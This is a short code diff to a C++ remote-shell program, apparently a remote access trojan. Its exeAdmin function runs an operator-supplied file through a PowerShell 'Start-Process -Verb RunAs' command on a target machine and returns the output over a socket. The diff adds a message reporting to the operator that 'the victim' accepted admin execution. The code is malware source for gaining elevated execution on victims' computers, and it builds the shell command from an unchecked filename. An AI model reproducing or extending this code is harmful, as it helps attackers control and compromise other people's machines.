@@ -74,6 +74,10 @@ void Shell::exeAdmin(Client* client,const std::string filename)
 	const std::string cmd = "powershell Start-Process " + filename + " -Verb RunAs";
 	std::string ret = Shell::return_command(cmd);
 	if (ret != ""){send(*client->getSock(), ret.c_str(), BUFFER_LEN, 0);}
+	else
+	{
+		client->send_b("The victim has accepted to execute in admin mode");
+	}
 	client->send_b("Done");
 }
 void Shell::exe(Client* client, const std::string filename)
